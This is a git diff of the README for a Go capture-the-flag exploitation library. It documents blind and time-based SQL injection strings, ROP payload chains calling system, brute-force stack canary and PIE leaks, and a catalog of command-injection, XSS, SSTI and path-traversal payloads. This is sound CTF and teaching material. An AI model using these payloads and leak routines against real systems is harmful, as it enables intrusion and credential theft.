@@ -72,520 +72,155 @@ for _, res := range results {
 ```sh
 go get github.com/tonythetender/pwngears
 ```
-Everything you need for the common case is re-exported from a single root package, so most exploits only need one import.
+Almost everything is re-exported from a single root package, so most exploits only need one import.
 ```go
 import . "github.com/tonythetender/pwngears"
 ```
-This gives you the whole dependency-free core (binary exploitation, web, cryptography, bruteforcing, injection payloads, scripting automation and the magic toolkit) under one namespace. The root package pulls in no third-party code, so an exploit built on it compiles to a lean static binary.
-
-If you prefer a more focused namespace, you can still import the individual subpackages directly.
-```go
-import (
-	"github.com/tonythetender/pwngears/web"
-	"github.com/tonythetender/pwngears/bruteforce"
-)
-```
-
-Features that rely on an external dependency live in their own opt-in subpackages, so they are only pulled into your binary when you actually import them. The HTML navigation package (`web/dom`) is one such example and is covered in its own section below.
-```go
-import "github.com/tonythetender/pwngears/web/dom"
-```
-## Basic Syntax
+This gives you the whole dependency-free core (binary exploitation, web, cryptography, bruteforcing, injection payloads, scripting automation and the magic toolkit) under one namespace, and compiles to a lean static binary with no third-party code. You can still import the subpackages directly (`pwngears/web`, `pwngears/bruteforce`, ...) if you prefer a narrower namespace. Features that need an external dependency live in their own opt-in subpackage, such as the HTML navigation package `web/dom`.
 
 > [!NOTE]
-> For the purpose of writing more compact code and because exploit dont normally involve a ton of other imports, we'll be using the `.` notation on imports. If you want to import other libraries or write your own functions that conflict with pwngears exported function, feel free to use more explicit import. 
+> The docs use the `.` dot-import for brevity. If you have name clashes with your own code or other libraries, switch to an explicit import.
 
-### Errors returns or logging
-This framework provides 2 different ways to open a connection. The methods attached to the connection will act the same but their return values will vary depending on the connection chosen. Because exploits shouldn't be more verbose than they need to be, the user can opt to not have errors returned from any methods. Instead a logger is used. This is the default connection.
+## Runnable examples
+Each area has a self-contained example that runs with no setup. A local stub stands in for the challenge server, so you can read the whole flow end to end.
+```sh
+go run ./examples/web/         # requests, form login, fuzzing, blind extraction
+go run ./examples/scripting/   # proof-of-work gate + interactive round loop
+go run ./examples/magic/       # decode chains, fingerprinting, cipher solving
+go run ./examples/process/     # payload building, cyclic offsets, local process (+ remote exploit template)
+```
 
+## Connections: logging or errors
+Every connection (`Conn` for web, `Process` and `Remote` for binary exploitation, and constructors like `NewBruteforcer`) comes in two flavors. The default returns values directly and logs, exiting on error, so a script stays terse.
 ```go
-conn := Conn("http://some-ctf-website.com")
+conn := Conn("http://chal.ctf")
 resp := conn.Get("/")
 ```
-
-While the default log level is `INFO`, the user can also set a custom logger by passing a logger to the connection constructor. The user can customized their own slog logger or use the default logger constructor with the chosen log level.
+If you prefer idiomatic Go error handling, open it with the `WithErrors` constructor and every method returns an `error` too.
 ```go
-logger, _ := NewDefaultLogger("DEBUG")
-conn := ConnWithLogger("http://some-ctf-website.com", logger)
-resp := conn.Get("/")
-```
-
-or
-```go
-conn := Conn("http://some-ctf-website.com")
-conn.SetLogLevel("ERROR")
-resp := conn.Get("/")
-```
-By default, the program will stop when an error is encountered. You can modify this behavior with the following function.
-```go
-conn.SetFailOnError(false)
-```
-
-The second way is with the more idiomatic, but verbose Go errors return. When opening the connection with the following function, all the methods will return an error value, except when it doesnt apply. You can then decide how to handle the error.
-```go
-conn, err := ConnWithErrors("http://some-ctf-website.com")
-if err != nil {
-	log.Fatalf("Connection couldn't be established: %v", err)
-}
+conn, err := ConnWithErrors("http://chal.ctf")
 resp, err := conn.Get("/")
-if err != nil {
-	log.Fatalf("Error during GET request: %v", err)
-}
 ```
-> [!NOTE]
-> The example given above are with the web connection, but they all work the same way with process and remote connections, as well as other constructors like the bruteforcer. Just replace `Conn` with `Process` or `Remote`. From here on out, to keep the documentation concise, the connection with the logger will be used.
-        
-### Web
-With the root import, the web helpers are already in scope.
-```go
-import . "github.com/tonythetender/pwngears"
-```
+The default (logger) style is used throughout these docs. Set its level with `conn.SetLogLevel("DEBUG")`, pass your own slog logger with `ConnWithLogger(url, logger)`, and stop it exiting on error with `conn.SetFailOnError(false)`.
 
-The connection keeps track of things like cookies and headers while making sure it doesn't time out or follow redirects indefinitely.
-
-From there you can make GET request simply like this :
-```go
-resp := conn.Get("/")
-
-fmt.Println(resp.Text())
-```
-
-You can also add query directly in the string or by adding parameters
+## Web
+GET with query parameters, headers, cookies, or auth, all passed as options.
 ```go
 resp := conn.Get("/search",
-	WithParam("category", "shoes"),
-	WithParam("color", "blue"),
-	WithParam("size", "9"))
-
-```
-You can add headers or cookies the same way, one at a time or in bulk.
-```go
-resp := conn.Get("/search",
-	WithHeader("Content-Type", "application/json"),
+	WithParam("q", "admin"),
+	WithHeader("X-Forwarded-For", "127.0.0.1"),
 	WithCookie("session", "abc123"))
 
-resp := conn.Get("/admin",
-	WithHeaders(map[string]string{"X-Forwarded-For": "127.0.0.1"}),
-	WithCookies(map[string]string{"role": "admin"}))
+resp := conn.Get("/api", WithBearer(token))   // or WithBasicAuth("admin", "admin")
 ```
-Authentication options are also available.
+POST a form as key/value pairs or a `Fields` map, JSON with `PostJSON`, or a hand-crafted body with `PostRaw`.
 ```go
-resp := conn.Get("/api", WithBearer(token))
-resp := conn.Get("/api", WithBasicAuth("admin", "admin"))
+conn.PostForm("/login", Fields{"user": "admin", "password": "hunter2"})
+conn.PostJSON("/api", map[string]any{"id": 1})
+conn.PostRaw("/api", `{"id":1}`, WithContentType("application/json"))
 ```
+`Put`, `Patch`, `Delete`, `Head` and `Options` round out the verbs. `NewForm()` handles multi-value fields, `LoadFields`/`LoadJSON` read a body from a file, and the package-level `Get`/`Post`/`PostForm`/`PostJSON` take a full URL for a one-off probe without a connection.
 
-To send a POST request, `PostForm` is the quickest way. You can pass the fields as key/value pairs, as a `Fields` map, or mix in request options.
+Read the response with helpers instead of hand-rolled parsing.
 ```go
-resp := conn.PostForm("/login", "username", "admin", "password", "hunter2")
+resp.Match(`password: (\w+)`)   // first capture group (or whole match)
+resp.Flag("FLAG")               // grep a FLAG{...} token
+resp.OK()                       // status in the 2xx range
+resp.Is(302)                    // exact status code
+resp.JSON(&out)                 // decode the body into a struct
+```
+Under the default connection `Match` and `Flag` exit when nothing matches (call `SetFailOnError(false)` for an empty result instead). A complete flow, with params, a form login, fuzzing and blind extraction, is in `examples/web`.
 
-resp := conn.PostForm("/login", Fields{
-	"username": "admin",
-	"password": "hunter2",
-})
+### DOM parsing
+To parse HTML rather than grep it, use the opt-in `web/dom` package (built on `golang.org/x/net/html`, so it stays out of the zero-dependency core).
+```go
+import "github.com/tonythetender/pwngears/web/dom"
 
-resp := conn.PostForm("/login", Fields{"username": "admin"},
-	WithHeader("X-CSRF-Token", token))
-```
-If you need multi-value fields or already have a `url.Values`, `Post` takes one directly.
-```go
-form := NewForm()
-form.Add("tag", "a")
-form.Add("tag", "b")
-resp := conn.Post("/filter", form)
-```
-The other HTTP verbs are available too. `Put` and `Patch` take a form body like `Post`, while `Delete`, `Head` and `Options` take only options.
-```go
-conn.Put("/item/1", Fields{"name": "updated"})
-conn.Delete("/item/1")
-conn.Head("/large-file")
-```
-
-### JSON
-When a challenge expects a JSON body instead of a form, use `PostJSON`. It accepts a struct, a map, or raw `string`/`[]byte`, and sets the `application/json` content type for you.
-```go
-resp := conn.PostJSON("/api/login", map[string]any{
-	"username": "admin",
-	"id":       1,
-})
-```
-For a hand-crafted body that is neither a form nor JSON, `PostRaw` sends a `string` or `[]byte` as-is and leaves the content type to you.
-```go
-resp := conn.PostRaw("/api", `{"id":1}`, WithContentType("application/json"))
-resp := conn.PostRaw("/upload", rawBytes, WithContentType("application/octet-stream"))
-```
-You can also keep the body or the form fields in a file and load them at runtime. `LoadFields` reads a JSON object into form fields (sent url-encoded, like a normal form), while `LoadJSON` reads a file to send as a raw JSON body.
-```go
-resp := conn.PostForm("/login", LoadFields("login.json"))
-resp := conn.PostJSON("/api", LoadJSON("payload.json"))
-```
-To read a JSON response back, pass a pointer to `JSON`.
-```go
-var out struct {
-	Token string `json:"token"`
-}
-resp.JSON(&out)
-fmt.Println(out.Token)
-```
-
-### One-off requests
-For a quick probe you don't need to build a connection first. The package-level `Get`, `Post`, `PostForm`, `PostJSON` and `PostRaw` take a full URL, fire a single request and return the response.
-```go
-resp := Get("http://some-ctf-website.com/robots.txt")
-resp := PostForm("http://some-ctf-website.com/login", Fields{"user": "admin"})
-resp := PostJSON("http://some-ctf-website.com/api", map[string]any{"id": 2})
-```
-Each call opens its own throwaway connection, so cookies are not kept between them. For a multi-step flow (such as logging in and then scraping) use a `Conn` instead.
-
-### Reading responses
-The response gives you a few helpers to avoid writing regexes by hand. `Match` returns the first capture group (or the whole match if there is no group), while `MatchAll` returns every match.
-```go
-resp := conn.Get("/profile")
-
-pass := resp.Match(`password: (\w+)`)
-tokens := resp.MatchAll(`token=(\w+)`)
-flag := resp.Flag("FLAG")
-```
-> [!NOTE]
-> With the default (logger) connection, `Match` and `Flag` stop the program if nothing matches, since you usually expect the value to be there. Use `SetFailOnError(false)` to instead get an empty result, or use the error-returning connection. `MatchAll` never fails on zero matches.
-
-You can also inspect the status, headers and cookies directly.
-```go
-if resp.OK() {            // status in the 2xx range
-	// ...
-}
-resp.Is(302)              // status code equals
-resp.Location()           // Location header
-resp.Cookie("session")    // value of a response cookie by name
-resp.Text()               // body as a string
-resp.Lines()              // body split into lines
-resp.Contains("admin")    // substring check on the body
-```
-
-### DOM parsing and navigation
-The helpers above search the raw body. When you need to actually parse the HTML, select elements, follow links or round-trip a form, use the opt-in `web/dom` package. It is built on `golang.org/x/net/html`, so it lives in its own subpackage and is only compiled into your binary when you import it.
-```go
-import (
-	. "github.com/tonythetender/pwngears"
-	"github.com/tonythetender/pwngears/web/dom"
-)
-```
-`dom.Fetch` requests a path through your connection and parses the result into a `Page`. From there you can select elements with a small CSS-like selector (tag, `.class`, `#id`, `[attr]`, `[attr=value]`, and descendant combinators) and read their attributes or text.
-```go
-conn := Conn("http://some-ctf-website.com")
 page := dom.Fetch(conn, "/")
-
 title := page.First("h1").Text()
-for _, a := range page.All("a[href]") {
-	fmt.Println(a.Attr("href"), "->", a.Text())
-}
+page.Form("#login").Set("user", "admin").Set("password", "x").Submit()
 ```
-Following a link reuses the same connection, so cookies and the session are kept. Relative links are resolved against the current page.
-```go
-next := page.First("a.next").Follow()   // or page.Follow("a.next")
-flag := next.Flag("FLAG")
-```
-`Form` is the most useful part for CTF. It pre-loads every field already in the form, including hidden inputs and CSRF tokens, so you only set what you want and submit. It posts to the form's resolved action with its method.
-```go
-after := page.Form("#login").
-	Set("username", "admin").
-	Set("password", "admin").
-	Submit()
+It has a small CSS-like selector (`tag`, `.class`, `#id`, `[attr=value]`, descendants), link following that keeps the session, and a `Form` that pre-loads hidden and CSRF fields so you only set what you change.
 
-if after.Contains("Welcome") {
-	// logged in, with the CSRF token carried over automatically
-}
-```
-The page also exposes convenience extractors.
+## Binary exploitation
+Connect to a local binary or a remote service. Both share the same send and receive API.
 ```go
-page.Links()              // all hrefs, resolved to absolute URLs
-page.Attrs("img", "src")  // one attribute across every match
-page.Texts(".comment")    // inner text of every match
-page.Flag("FLAG")         // grep the page for a flag
-```
+p := Process("./chal")          // with args: Process("./chal", "arg1")
+r := Remote("chal.ctf", 1337)   // with TLS: Remote(host, port, SSL())
 
-### Binary exploitation
-The binary exploitation helpers come with the root import as well.
-```go
-import . "github.com/tonythetender/pwngears"
+r.SendLineAfter("Name: ", "Arthur")
+leak := U64(r.Recv(8))
 ```
-To do binary exploitation (ie pwning and reverse) you can connect to a process either localy through an executable
-```go
-conn := Process("./command")
-defer conn.Close()
-```
-You can pass command-line arguments directly. To set environment variables (for example to load a specific libc with `LD_PRELOAD`), use `ProcessWith`.
-```go
-p := Process("./command", "arg1", "arg2")
+`ProcessWith(path, WithEnv(...))` sets environment variables (for example an `LD_PRELOAD` libc), and `SSL()` combines with `WithSNI` and `WithVerifyCert`.
 
-p := ProcessWith("./command",
-	WithArgs("arg1"),
-	WithEnv(map[string]string{"LD_PRELOAD": "./libc.so.6"}),
-)
-```
-Or through a tcp connection
+Payloads are built fluently. `Pay()` and `Flat()` take any mix of parts: a `string` or `[]byte` goes in raw, and an integer is packed little-endian (64-bit by default, since addresses are the common case).
 ```go
-r := Remote("127.0.0.1", 12069)
-```
-With the possibility of SSL/TLS over TCP. Self-signed certificates are accepted by default, since CTF servers typically use them.
-```go
-r := Remote("127.0.0.1", 12069, SSL())
-```
-You can set a specific SNI or enforce proper certificate verification.
-```go
-r := Remote("127.0.0.1", 12069, SSL(), WithSNI("chal.ctf"))
-r := Remote("127.0.0.1", 12069, SSL(), WithVerifyCert(true))
-```
-You can then send inputs directly to the process. The library takes care of converting the string to bytes, but you can also explicitly send bytes to it. Those wont be converted again.
-```go
-r.SendLine("shellcode")
-r.SendLine([]byte("shellcode"))
-```
-You can also send an input after the process as output a certain line
-```go
-r.SendLineAfter("Name: ", "John")
-```
-
-#### Building payloads
-Payloads are built fluently. `Pay()` (or `Flat()`) takes any mix of parts in a single call: a `string` or `[]byte` is appended raw, and an integer is packed little-endian. Bare integers are packed as 64-bit, since addresses are the common case. Use a `uint32`/`uint16`/`byte` value (or `P32`/`P16`/`P8`) when you need a narrower width.
-```go
-// padding is []byte, the rest are uint64 addresses
-Flat(padding, popRdi, binsh, ret, system)
-```
-You can also chain builders, which reads well for the classic "padding then addresses" layout. `PadTo` fills with `A` up to a length, `.Flat(...)` splices in a run of parts, and `Ret` is an alias for `P64` that documents intent.
-```go
-payload := Pay().
-	PadTo(72).
-	Flat(popRdi, binsh, ret).
-	Ret(system)
-
-r.SendPayload(payload)
+r.SendPayload(Pay().PadTo(72).Flat(popRdi, binsh, ret).Ret(system))
 ```
 > [!NOTE]
-> `Pay(...)`, `Flat(...)` and `.Flat(...)` pack a bare integer as 8 bytes. The older `.Add(...)` method still packs an `int` as 4 bytes, so prefer `Flat`/`P64`/`Ret` for 64-bit addresses to avoid silently truncating them.
+> `Pay`, `Flat` and `.Flat` pack a bare integer as 8 bytes. The older `.Add` packs an `int` as 4, so prefer `Flat`, `P64` or `Ret` for 64-bit addresses to avoid silently truncating them.
 
-## Advanced Syntax
+Leaking a stack canary or PIE base one byte at a time (brute-forced in parallel), the `NewExploit` reconnect flow, GDB attach, and cyclic-offset finding are shown end to end in `examples/process`. The leak helpers take a raw tube, so there you open the connection with `NewRemote` rather than the `Remote` wrapper.
 
-### Bruteforcing and oracles
-A lot of challenges make you recover a value one character at a time: blind SQL injection, a comparison endpoint, a reset token check. The `Bruteforcer` drives the loop, and an *oracle* tells it whether a guess is correct.
+## Bruteforcing and oracles
+Recovering a value one character at a time (blind SQLi, a comparison endpoint, a reset-token check) always has the same shape: a `Bruteforcer` drives the loop and an *oracle* answers yes or no. There are two strategies, and the method names follow them.
 
-`Oracle` turns "send a payload, then look at the response" into the yes/no test the bruteforcer expects. You decide how the payload is sent (query parameter, path, header, body) and what counts as success.
-```go
-conn := Conn("http://some-ctf-website.com")
+- `Greater` with `BinarySearch`, when the oracle can compare (is byte > N). About 7 requests per character.
+- `Equal` with `Scan`, when it can only test equality. One request per candidate, for a filtered target or a small known alphabet.
 
-oracle := Oracle(
-	func(guess string) *Response {
-		q := fmt.Sprintf("1 AND SUBSTRING(password,1,%d)='%s'", len(guess), guess)
-		return conn.Get("/item", WithParam("id", q))
-	},
-	func(r *Response) bool { return r.Contains("found") },
-)
-
-bf := NewBruteforcer()
-bf.Charset = GenerateCharset("lowercase", "digits")
-bf.Workers = 16 // test the charset concurrently, leave at 1 for a sequential scan
-bf.Delay = 50 * time.Millisecond
-
-password, _ := bf.BruteforceCharByChar("", "", oracle)
-```
-`Workers` races the whole charset for each position and stops as soon as a character matches, which is a big speedup against a slow endpoint. Set it back to `1` when the target is rate limited or order sensitive.
-
-### Binary search extraction
-When the oracle can answer "is the byte at this position greater than N", you can binary-search each character instead of scanning the whole charset. That is about 7 requests per character rather than one per candidate.
-
-`GreaterOracle` builds the comparison test, and `BinarySearch` drives it (positions are 1-indexed, and extraction stops when it reaches the end of the string).
+You build the oracle from how the payload is sent and what counts as success.
 ```go
 greater := GreaterOracle(
-	func(pos, value int) *Response {
-		q := fmt.Sprintf("1 AND ASCII(SUBSTRING(password,%d,1))>%d", pos, value)
-		return conn.Get("/item", WithParam("id", q))
-	},
+	func(pos, value int) *Response { return conn.Get("/item", WithParam("id", q.Greater(pos, value))) },
 	func(r *Response) bool { return r.Contains("found") },
 )
-
-bf := NewBruteforcer()
-bf.MaxLength = 32
-password, _ := bf.BinarySearch(greater)
+password, _ := NewBruteforcer().BinarySearch(greater)
 ```
-
-### Fuzzing
-For discovery (directories, parameters, subdomains) `Fuzz` runs a wordlist concurrently and keeps the responses that pass your filters. You provide a function that sends the request for a word, so the injection point is wherever you put it.
-```go
-hits := Fuzz(
-	func(word string) *Response { return conn.Get("/" + word) },
-	wordlist,
-	MatchStatus(200, 301),
-	FilterLength(1234),
-)
-for _, h := range hits {
-	fmt.Printf("%-20s status=%d len=%d\n", h.Word, h.Status, h.Length)
-}
-```
-Filters are combined with AND. `MatchStatus`, `MatchLength` and `MatchRegex` keep a response, while `FilterStatus`, `FilterLength` and `FilterRegex` discard one (handy for hiding a known "not found" page). Fuzzing runs 20 workers by default. Use `Fuzzer{Workers: n}.Run(...)` to change that. Hits come back in wordlist order.
-
-### Time-based SQLI
-Sometimes the response is identical whether the guess is right or wrong, and the only signal is how long the query takes. `TimingAttack` measures each attempt and keeps a character when the request runs longer than your threshold. It stays sequential on purpose, since running attempts in parallel would add noise to the timing.
-```go
-bf := NewBruteforcer()
-bf.Charset = GenerateCharset("lowercase", "digits")
-
-password, _ := bf.TimingAttack("", func(guess string) time.Duration {
-	payload := fmt.Sprintf(
-		"1 UNION SELECT IF(SUBSTRING(password,1,%d)='%s',SLEEP(3),0) FROM users",
-		len(guess), guess)
-	start := time.Now()
-	conn.Get("/item", WithParam("id", payload))
-	return time.Since(start)
-}, 3*time.Second)
-```
+Set `bf.Workers` to race the charset concurrently and `bf.Delay` for a rate-limited target. `TimingAttack` covers the case where the only signal is how long a request takes. `examples/web` runs `CharOracle` with `Scan` against a live stub.
 
 ### Injection payloads
-Writing injection strings by hand is fiddly and backend-specific. The `payloads` helpers (re-exported at the root) build them for you.
-
-For blind extraction, `SQLi` describes *what* you want to read once and generates the per-position conditions in the right dialect, so you never hand-write `SUBSTRING` / `SUBSTR` / `ASCII` / `UNICODE` / `LENGTH` / `LEN` and never pick the wrong one.
+`SQLi` generates blind-extraction conditions in the right dialect, so you never hand-write `SUBSTRING`, `ASCII` or `LENGTH` or pick the wrong one.
 ```go
-q := SQLi{Dialect: MySQL, Expr: "password", From: "users", Where: "id=1"}
+q := SQLi{Dialect: MySQL, Expr: "password", From: "users", Prefix: "1 AND ", Suffix: MySQL.Comment()}
 
-q.Greater(pos, value)   // ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),pos,1))>value
-q.Equal(pos, 'a')       // SUBSTRING((...),pos,1)='a'
-q.LengthGreater(10)     // LENGTH((...))>10
+q.Greater(pos, value)   // 1 AND ASCII(SUBSTRING((SELECT password FROM users),pos,1))>value--
+q.Equal(pos, 'a')
+q.LengthGreater(10)
 ```
-Available dialects are `MySQL`, `Postgres`, `SQLite`, `MSSQL` and `OracleDB`. `Expr` can be any sub-expression (a column, `@@version`, `database()`, a full subquery), while `From` and `Where` are optional. Set `Prefix`/`Suffix` to glue in your injection context once instead of on every call.
+Dialects are `MySQL`, `Postgres`, `SQLite`, `MSSQL` and `OracleDB`, and the conditions drop straight into the oracles above. To throw a list of known vectors at an endpoint, the catalog returns ready-made payloads for `Fuzz`: `AuthBypass`, `UnionNull`, `OrderBy` and `TimeDelay` for SQL, plus `CmdInjection`, `PathTraversal`, `SSTI`, `XSS` and `NoSQL`.
+
+### Fuzzing
+`Fuzz` runs a wordlist concurrently and keeps the responses that pass your filters.
 ```go
-q := SQLi{Dialect: MySQL, Expr: "password", From: "users",
-	Prefix: "1 AND ", Suffix: MySQL.Comment()}
-
-q.Greater(pos, value)   // 1 AND ASCII(SUBSTRING(...))>value--
+hits := Fuzz(func(w string) *Response { return conn.Get("/" + w) }, wordlist, MatchStatus(200, 301))
 ```
-That drops straight into the binary-search extraction shown above:
-```go
-greater := GreaterOracle(
-	func(pos, value int) *Response {
-		return conn.Get("/item", WithParam("id", q.Greater(pos, value)))
-	},
-	func(r *Response) bool { return r.Contains("found") },
-)
-password, _ := bf.BinarySearch(greater)
-```
-If the target filters `>`/`<`, or the value uses a small known alphabet, scan with `Equal` instead. `CharOracle` builds the test and `Scan` drives it: it tries the bruteforcer's charset at each position and stops at the end of the string, exactly like `BinarySearch` does, just one candidate at a time rather than halving a range. In short, `Greater` pairs with `BinarySearch`, `Equal` pairs with `Scan`.
-```go
-scan := CharOracle(
-	func(pos int, c byte) *Response {
-		return conn.Get("/item", WithParam("id", q.Equal(pos, c)))
-	},
-	func(r *Response) bool { return r.Contains("found") },
-)
+`MatchStatus`/`MatchLength`/`MatchRegex` keep a response, and the matching `Filter*` discard one (handy for hiding a known "not found" page). It runs 20 workers by default and returns hits in wordlist order.
 
-bf.Charset = GenerateCharset("lowercase", "digits")
-password, _ := bf.Scan(scan)
-```
-When you just want to throw a list of known vectors at an endpoint, the catalog returns ready-made payloads that feed `Fuzz` directly. For SQL there is `AuthBypass()`, `UnionNull(n)`, `OrderBy(n)` and `TimeDelay(dialect, seconds)`. For other classes there is `CmdInjection()`, `PathTraversal()`, `SSTI()`, `XSS()` and `NoSQL()`.
-```go
-hits := Fuzz(
-	func(p string) *Response { return conn.Get("/render", WithParam("name", p)) },
-	SSTI(),
-	MatchRegex("49"),   // the template engine evaluated {{7*7}}
-)
-```
-
-### Scripting and automation
-Many challenges are a connect-and-loop grind: read a prompt, compute an answer, send it, and repeat. That often means hundreds of rounds under a timer, sometimes behind a proof-of-work gate. The scripting helpers (in scope with the root import) turn that into a few lines.
-
-`Expect` drives the loop. Each round it reads a chunk and hands you a `Round`. You reply with `r.Send(...)` (numbers go out as their decimal text, since these are text protocols), end the loop with `r.Stop()`, or do nothing to skip the round.
+## Scripting and automation
+Interactive challenges are a connect-and-loop grind: read a prompt, compute an answer, send it, repeat, often behind a proof-of-work gate. `Expect` drives the loop and hands each round a `Round`.
 ```go
 r := Remote("chal.ctf", 1337)
 defer r.Close()
 
-// Answer 500 "a + b" prompts.
 Expect(r, nil, 500, func(r *Round) {
 	n := r.Ints()
 	r.Send(n[0] + n[1])
 })
 ```
-A `Round` embeds a `Prompt`, which parses the chunk with the same helpers as a web `Response`: `Match`/`MatchAll`/`Group` (regex), `Int`/`Ints`/`BigInt`, `Hex`, `Base64` and `Flag`. You can `Send` more than once, or not at all, and `r.Tube()` is the escape hatch for a round that needs extra reads.
-```go
-Expect(r, nil, 0, func(r *Round) {   // 0 rounds = until Stop or EOF
-	flag := r.Flag("flag")
-	if flag != "" {
-		fmt.Println(flag)
-		r.Stop()
-		return
-	}
-	r.Send(r.Int() * 2)   // echo and compute
-})
-```
-For finer control, build a `Loop` fluently: `NewLoop(r).Until("> ").Rounds(100).Timeout(30*time.Second).Run(fn)`. `Until` sets the per-round delimiter (default: a line). `Timeout` is a real deadline on remote connections, so a blocked read is interrupted rather than hanging the script. If you would rather write the loop yourself, `r.TryRecvLine()` and `r.TryRecvUntil(delim)` return `(data, ok)` with `ok == false` on end-of-stream instead of exiting.
+A `Round` embeds a `Prompt` (`Int`/`Ints`/`BigInt`, `Hex`, `Base64`, `Match` and `Flag`). Reply with `r.Send(...)`, end the loop with `r.Stop()`, or do nothing to skip a round. For finer control, `NewLoop(r).Until("> ").Rounds(100).Timeout(30*time.Second).Run(fn)` sets the delimiter, a round cap and a real read deadline (a blocked read is interrupted instead of hanging the script).
 
-**Proof-of-work gates** are solved in parallel (one goroutine per core). The canonical forms are one-liners:
+Proof-of-work gates are solved in parallel.
 ```go
-// sha256(prefix || X) with 24 leading zero bits (redpwn style):
-pow := PoWLeadingZeroBits([]byte(prefix), 24)
+pow := PoWLeadingZeroBits([]byte(prefix), 24)   // redpwn style
 r.SendLine(pow.Suffix)
-
-PoWLeadingZeroNibbles(prefix, 6)   // hex digest starts with 6 zeros
-PoWPrefixEquals(prefix, target)    // digest starts with target bytes
-PoWSuffixEquals(target)            // sha256(X) ends with target (hashes X alone)
 ```
-Each returns the found `X` as `Suffix` (with the full `Input` and `Digest`). Tune with `WithPoWWorkers`, `WithPoWTimeout`, and `WithPoWEncoding`/`WithPoWCharset` (decimal by default, or hex, raw bytes, or a restricted charset). For an unusual gate, `SolveHashPoW(prefix, func(sum []byte) bool { ... })` takes any predicate over the digest.
+Also `PoWLeadingZeroNibbles`, `PoWPrefixEquals`, `PoWSuffixEquals`, and `SolveHashPoW` for any predicate over the digest. When the gate is announced on the wire, `ClearPoW(r, pattern, bits)` reads the line, extracts the prefix, solves and sends in one call. `examples/scripting` is a complete solve, proof-of-work plus round loop, against a built-in stub.
 
-When the gate is announced on the wire, `ClearPoW` reads the line, extracts the prefix, solves and sends in one call. The pattern captures the prefix (a group named `prefix`, or the first group), and an optional `bits` group overrides the difficulty argument.
+## Magic: decode, identify, auto-solve
+The magic helpers replace the CyberChef, hashid and `file` round-trip, offline.
 ```go
-// line looks like: "proof of work: sha256(prefix=aB3xZ + X) needs 24 zero bits"
-ClearPoW(r, `prefix=(?P<prefix>\w+)`, 24)
+Magic(blob, WithFlagRegex(`flag\{[^}]*\}`))   // peel base64/hex/binary/rot/... layers, ranked best-first
+Identify(blob)                                // hash type, encoding, file type, timestamp guesses
+AutoSolve(ciphertext)                         // Caesar/XOR/Vigenere/rail-fence/substitution, ranked
 ```
-
-### Magic: decode, identify, auto-solve
-The other recurring grind is working out what an opaque blob even is, then peeling encoding layers, identifying a hash or file type, or recognizing and cracking a classical cipher. The magic helpers do this offline, no CyberChef / hashid / dcode round-trip.
-
-`Magic` auto-detects and strips encoding layers (base64/base32/hex/binary/ascii-decimal/url and ROT-n) in a scored best-first search, returning candidate chains ranked best-first.
-```go
-for _, d := range Magic(blob, WithFlagRegex(`flag\{[^}]*\}`)) {
-	fmt.Printf("%q  via %v\n", d.Output, d.Chain)  // e.g. "flag{...}" via [hex base64 rot:13]
-}
-```
-Pass `WithFlagRegex` (or your CTF's prefix) so the real flag ranks first. Otherwise candidates are ranked by how English-like they look. `WithDepth` caps how many layers are peeled. The individual codecs (`B64Decode`, `HexDecode`, `BinaryDecode`, `DecimalDecode`, `URLDecode`, `ROT`) are exported too.
-
-`Identify` fingerprints a blob the way `hashid` + `file` would: likely hash types (by length/charset and structured prefixes like `$2b$`), encodings, file type (magic bytes) and timestamp interpretations.
-```go
-fp := Identify([]byte("5d41402abc4b2a76b9719d911017c592"))
-// fp.Charset == "hex", and fp.HashGuesses includes MD5, NTLM, ...
-```
-`AutoSolve` identifies and cracks classical ciphers: Caesar/ROT, single-byte XOR, Vigenère (key length via index of coincidence), rail-fence and substitution (frequency hill-climb). It scores each result for English-ness and returns ranked candidates.
-```go
-for _, c := range AutoSolve(ciphertext) {
-	fmt.Printf("%-12s %q\n", c.Method, c.Plaintext)
-}
-```
-Narrow the search with `WithSolveMethods("vigenere", "xor")`, bound Vigenère with `WithSolveMaxKeyLen`, and set `WithSolveFlagRegex` to rank a known flag format to the top. The substitution solver uses a compact built-in English model (no external data), so it recovers typical prose to a strongly-English decryption, occasionally leaving a few rare letters to fix by eye. The new `RailFenceCipher` and `SubstitutionDecrypt` are also exported for direct use (RailFence plugs into the crypto `BruteForce` engine like any other `Cipher`).
-
-Both tools are shown end to end in runnable examples. `go run ./examples/scripting/` solves an interactive proof-of-work and round loop against a built-in stub server (so it runs with no setup), and `go run ./examples/magic/` runs the offline decode, identify and auto-solve flow.
-
-### Binary Exploitation
-Some helpers automate leaking a stack canary or an address by brute-forcing one byte at a time. These helpers operate on the raw `Tube`, so open the connection with `NewRemote` (which returns a tube) rather than the logger wrapper, and give the exploit a function that reconnects and gets you back to the leak point.
-
-Each guess needs a check that tells the brute-forcer whether the byte was right. Rather than writing that closure by hand every time, the ready-made checks cover the common cases: `RecvLineContains` / `RecvContains` look for a marker in the response, while `Survives` / `Crashed` key off whether the connection stayed alive after the payload.
-```go
-r, _ := NewRemote("127.0.0.1", 12069)
-defer r.Close()
-
-exploit := NewExploit(r)
-exploit.SetConnectFunc(func() Tube {
-	c, _ := NewRemote("127.0.0.1", 12069)
-	c.SendLine("Arthur")
-	return c
-})
-
-// The byte is correct when the "Saved" line is displayed.
-canary, _ := exploit.LeakCanary(40, RecvLineContains("Saved"))
-retAddr, _ := exploit.LeakAddress(40, canary, 8, RecvLineContains("Saved"))
-
-pieBase := retAddr - 0x1811
-winAddr := pieBase + 0x12e9
-
-Pay().
-	PadTo(40).
-	Canary(canary).
-	Repeat("B", 8).
-	Ret(winAddr).
-	SendWithSize(r)
-```
-Because every guess reconnects through `SetConnectFunc`, the leaks are brute-forced concurrently by default (8 workers), which turns a slow byte-at-a-time canary leak into a quick one. Tune it with `exploit.SetWorkers(n)`, or set it to `1` to go sequential against a rate-limited target. When the exploit runs against a local `Process` with no reconnect function, there is nothing fresh to reconnect to, so it automatically stays sequential.
+Pass `WithFlagRegex` to `Magic` (or `WithSolveFlagRegex` to `AutoSolve`) so a known flag format ranks first, otherwise candidates are ranked by how English-like they read. The individual codecs (`B64Decode`, `HexDecode`, `BinaryDecode`, `ROT`, ...) are exported for direct use, as are the new `RailFenceCipher` and `SubstitutionDecrypt`. `examples/magic` runs all three end to end.
